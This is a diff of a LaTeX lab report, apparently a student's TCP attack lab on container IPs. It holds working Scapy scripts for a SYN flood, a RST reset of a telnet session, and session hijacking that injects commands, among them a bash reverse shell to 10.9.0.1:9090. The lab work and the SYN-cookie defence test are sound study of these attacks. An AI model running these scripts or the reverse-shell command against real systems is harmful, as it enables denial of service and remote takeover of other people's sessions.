@@ -60,23 +60,193 @@
 \section*{Task 1}
 
 \subsection*{Task 1.1}
+For this task we will need to determine first what port to connect to thus we will perform the following command.\\
+
+\begin{figure}[!ht]
+  \includegraphics*{Task1getPort.png}
+\end{figure}
+
+We will be connecting with port 23, we know that our victum machine can be connected with the ip address 10.9.0.5. We will need 
+to modify our sript in order to perform the attack on the machine. Making the modfications we will have the following script. 
+This can be viewed in the file syn.py.\\
+
+\begin{lstlisting}
+  #!/bin/env python3
+  from scapy.all import IP, TCP, send
+  from ipaddress import IPv4Address
+  from random import getrandbits
+  ip = IP(dst="10.9.0.5")
+  tcp = TCP(dport=23, flags="S")
+  pkt = ip/tcp
+  while True:
+      pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
+      pkt[TCP].sport = getrandbits(16) # source port
+      pkt[TCP].seq = getrandbits(32) # sequence number
+      send(pkt, verbose = 0)
+\end{lstlisting}
+
+Now we can perform our attack.
+
+\begin{figure}[!ht]
+  \includegraphics*{Task1.1InitalAttack.png}
+\end{figure}
+
+However we were able to establish a connection since when we reach the log in portion 
+the connection has been established. This is because python executes very slowly and thus 
+we need more instances running. Cancelling the process and waiting for the connection to time out 
+we can repeat, for this we will run 5 scripts performing the attack.
+
+\begin{figure}[!ht]
+  \includegraphics*{Task1.1Attempt2Attack.png}
+\end{figure}
+
+We can now see that the attack has successfully happened and the user was unable to access the victum machine.
 
 \subsection*{Task 1.2}
 
+Repeating this attack but first compiling the c program. We can now execute it.\\
+
+% TODO crop this
+\begin{figure}[!ht]
+  \includegraphics*{Task1.2Fail.png}
+\end{figure}
+
+In this one we can see that the attack is on going and that the user was unable to gain access to the victum. Unlike the previous 
+attack this only required one program. This one only required one instance as C is significantly faster than python.
+
+
 \subsection*{Task 1.3}
+
+We will now repeat these attack with the same conditions as we did in both previous tasks. Starting with the 
+python program. We will need to enable SYN cookies.\\
+
+\begin{figure}[!ht]
+  \includegraphics*{1.3pythonCookies.png}
+\end{figure}
+
+We can see that we've enabled SYN cookies. In this one we can see the anti flood measures working as the user was able to successfully establish a connection this time.
+Lets repeat again with the c program and see what happens.
+
+\begin{figure}
+  \includegraphics*{Task1.3cflood.png}
+\end{figure}
+
+Once again we can see the SYN cookies have been enabled and that the anti flood measured worked. The user was able to establish a connection.
 
 \section*{Task 2}
 
-\section*{Task 3}
-So what we need to do is get the port, most recent ACK and most recent SEQ 
-sent. This will then allow us to execute a command however, this freezes the 
-users terminal and they are now unable to do anything.
+For this one we need to obtain some information. In order to obtain this information we will need to use wireshark, we are looking for the ACK, SEQ, IP, and 
+port. We will connect using telnet and and view the most recent TCP packet. Opening wireshark we can see the following.
 
-After launching the attack the window goes unresponsive and we'll need to 
-rejoin the container to finish. 
+\begin{figure}
+  \includegraphics*{task2WiresharkPacket.png}
+\end{figure}
+
+In wireshark we can see the information we need. We can see the source ip address, the source port is 48336, and sequence is 2560596923. Using this information we will make the following program to launch the attack.  The code below 
+will be what we use to launch the attack, it can be viewed in task2.py
+
+\begin{lstlisting}
+  #!/usr/bin/env python3
+  from scapy.all import *
+  from scapy.all import IP, TCP
+  
+  ip = IP(src="10.9.0.6", dst="10.9.0.5")
+  tcp = TCP(sport=48336, dport=23, flags="R", seq=2560596923)
+  pkt = ip/tcp
+  ls(pkt)
+  send(pkt, verbose=0)
+\end{lstlisting}
+
+We can now launch the attack.
+
+\begin{figure}
+  \includegraphics*{Task2AttackLaunch.png}
+\end{figure}
+
+We can see that the attack was launched on a user who was connected to the victum machine. The user was the forced to disconnected.
+
+% TODO: Repeat this unless I can find the image.
+\section*{Task 3}
+For this one we will need to have a user start a session with the victum, once again we will need to get the previous information but for this we will also need 
+the ACK. Wiresharking again we see the following information from a packet. We will want to collect this information from the most recent TCP packet sent from the 
+user.
+
+\begin{figure}
+  \includegraphics*{Task3Packet2.png}
+\end{figure}
+
+
+With that we obtain the following information, a source port of 57328, a sequence of 1960804135, and a ack of 1174207624. For the data we will 
+want some command we wish to perform. For this we are going to create a file called danger.txt. This can also be viewed in task3.py\\
+
+\begin{lstlisting}
+  #!/usr/bin/env python3
+  from scapy.all import *
+  
+  ip = IP(src="10.9.0.6", dst="10.9.0.5")
+  tcp = TCP(sport=57328, dport=23, flags="A", seq=1960804135, ack=1174207624)
+  data = "touch ./danger.txt\r"
+  pkt = ip/tcp/data
+  ls(pkt)
+  send(pkt, verbose=0)
+\end{lstlisting}
+
+We can now launch the attack.
+
+\begin{figure}
+  \includegraphics*{Task32AttackPerform.png}
+\end{figure}
+
+In this one we've performed the attack, the user's terminal session has stopped responding and is unable to do anything. We've created the file danger.txt however, the 
+user will need to start a new session to confirm.\\
+
+
+\begin{figure}
+  \includegraphics*{Task32RIGHTafterAttack.png}
+\end{figure}
+
+Now that we've logged back into the server, we now used the command ls and we can see the file danger.txt is there. Thus successfully pulling off the attack.\\
+
+
 
 \section*{Task 4}
-Very similar to Task 3 however, we will need to run it in the background 
-and netcat will run in the foreground.
+Once again we will need to use wireshark to determine some information for when we perform the attack.\\
+
+\begin{figure}
+  \includegraphics*{Task4TargetPacket.png}
+\end{figure}
+
+Looking at this packet we can see the following information. The source port of 35062, sequence of 4180794967 and acknowledement of 1151693991.
+Using that we can make the following python program. The data will be the command we want to execute in order to create a reverse shell. This 
+code can also be viewed in task4.py
+
+\begin{lstlisting}
+#!/usr/bin/env python3
+from scapy.all import *
+
+ip = IP(src="10.9.0.7", dst="10.9.0.5")
+tcp = TCP(sport=35062, dport=23, flags="A", seq=4180794967, ack=1151693991)
+data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
+pkt = ip/tcp/data
+ls(pkt)
+send(pkt, verbose=0)
+sniff()
+\end{lstlisting}
+
+Executing the command the following happens.
+
+\begin{figure}
+  \includegraphics*{Task4Attack.png}
+\end{figure}
+
+In order to perform this attack we will need to run the script in the background and then our netcat command in the forground to allow us 
+to set up the reverse shell. With this reverse shell we are going to create a file hello.txt. We will now exit out, the users shell had 
+became unresponsive. After the user logs in we will verify if the files are there.
+
+\begin{figure}
+  \includegraphics*{Task4afterAttack.png}
+\end{figure}
+
+As we can see hello.txt is now in the file system and the attack had been successfully performed.
 
 \end{document} 
